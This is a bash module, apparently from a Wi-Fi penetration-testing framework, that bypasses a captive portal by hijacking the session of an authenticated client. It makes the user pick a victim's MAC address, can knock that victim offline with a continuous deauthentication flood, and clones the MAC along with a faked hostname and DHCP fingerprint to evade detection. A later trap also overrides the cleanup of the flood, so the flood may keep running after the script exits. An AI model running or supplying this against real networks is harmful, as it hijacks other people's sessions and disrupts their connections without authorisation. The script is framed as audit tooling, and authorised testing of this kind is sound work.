#!/usr/bin/env bash
# MODULE_META
# NAME="Captive Portal Bypass"
# CATEGORY="F"
# DEPS="A4"
# CRITICAL="no"
# TOOLS="macchanger,curl,aireplay-ng"
# DESC="Bypass captive portal via MAC spoofing of authenticated clients"
# REQS="managed_iface,target_ssid"
# PCAP="no"
# DECODE="none"

#===============================================================================
#  modules/f4_portal_bypass.sh
#  F4: Captive Portal Bypass (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Identify authenticated MACs from A4 Client Fingerprinting.
#  2. Interactive Selection: Select a target MAC to clone.
#  3. Deauthenticate the victim to prevent ACK storms/collisions.
#  4. Spoof local MAC and request DHCP to hijack the session.
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
TARGET_BSSID="${GUEST_BSSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="F4"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo "[*] Initializing Captive Portal Bypass tactical options..."

# 1. Identity Selection
# We try to find the PNL file from A4
A4_FILE="${EVIDENCE_DIR}/a4_parsed_probes.txt"
if [[ ! -f "$A4_FILE" ]]; then
    echo "[!] A4 findings not found. Please run A4 (Client Fingerprinting) first."
    exit 1
fi

CLIENTS=()
while IFS="|" read -r mac pnl; do
    CLIENTS+=("$mac")
done < "$A4_FILE"

if [[ ${#CLIENTS[@]} -eq 0 ]]; then
    echo "[!] No clients identified by A4. Aborting."
    exit 1
fi

echo "[?] Select target MAC to clone:"
for i in "${!CLIENTS[@]}"; do
    echo "    $((i+1))) ${CLIENTS[$i]}"
done
read -p "Selection [1-${#CLIENTS[@]}]: " choice

if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -le ${#CLIENTS[@]} ]]; then
    VICTIM_MAC="${CLIENTS[$((choice-1))]}"
    echo "[*] Target Victim: $VICTIM_MAC"
else
    echo "[!] Invalid selection."
    exit 1
fi

# 2. Roaming / Suppression
echo "[?] Suppress victim to prevent IP/ACK collision?"
echo "    1) YES (Targeted Deauth flood - Stealthier)"
echo "    2) NO (Risk instability)"
read -p "Selection [1/2]: " deauth_choice

if [[ "$deauth_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo "[*] Starting victim suppression in background..."
    aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$VICTIM_MAC" "$INTERFACE" > /dev/null 2>&1 &
    DEAUTH_PID=$!
    trap 'kill $DEAUTH_PID 2>/dev/null || true' EXIT
fi

# 3. Spoofing Execution
echo "[*] Executing Full Identity Spoofing for $VICTIM_MAC..."
ip link set "$INTERFACE" down
macchanger -m "$VICTIM_MAC" "$INTERFACE"

# Spoof Hostname (Advanced Evasion)
OLD_HOSTNAME=$(hostname)
SPOOFED_HOSTNAME="iPad-of-$(echo $VICTIM_MAC | cut -d: -f5,6 | tr -d ':')"
echo "[*] Temporarily spoofing hostname to $SPOOFED_HOSTNAME..."
hostname "$SPOOFED_HOSTNAME"
trap "hostname $OLD_HOSTNAME" EXIT

ip link set "$INTERFACE" up

echo "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
# Create custom dhclient.conf to mimic iOS/Android parameters
DHCP_CONF="${EVIDENCE_DIR}/f4_dhclient.conf"
cat <<EOF > "$DHCP_CONF"
send host-name "$SPOOFED_HOSTNAME";
request subnet-mask, broadcast-address, time-offset, routers,
        domain-name, domain-name-servers, domain-search, host-name,
        netbios-name-servers, netbios-scope, interface-mtu,
        rfc3442-classless-static-routes, ntp-servers;
EOF

timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true

# 4. Verification
echo "[*] Verifying internet access..."
BYPASS_LOG="${EVIDENCE_DIR}/${TC_ID}_bypass.log"
if curl -s --connect-timeout 5 http://www.google.com > /dev/null; then
    echo "[!] SUCCESS: CAPTIVE PORTAL BYPASSED!" | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Captive Portal Bypass Successful" \
        --severity CRITICAL \
        --desc "Successfully bypassed captive portal for SSID $SSID by spoofing authenticated MAC $VICTIM_MAC." \
        --target "$SSID" \
        --evidence "$BYPASS_LOG" \
        --rationale "Captive portals that rely solely on MAC addresses for session tracking are highly vulnerable to identity cloning."
else
    echo "[+] Bypass attempt complete. No internet access detected." | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[F4] Audit Complete" \
        --severity INFO \
        --desc "Attempted MAC spoofing bypass for $SSID. Unrestricted access not achieved." \
        --target "$SSID" \
        --evidence "$BYPASS_LOG" \
        --rationale "Bypass failure may indicate advanced session tracking (e.g., sequence numbering, browser fingerprinting) or lack of active authorized sessions."
fi

# 5. Restore MAC (Optional but good practice)
echo "[?] Restore original MAC? [y/N]"
read -r restore
if [[ "$restore" == "y" ]]; then
    ip link set "$INTERFACE" down
    macchanger -p "$INTERFACE"
    ip link set "$INTERFACE" up
fi

exit 0
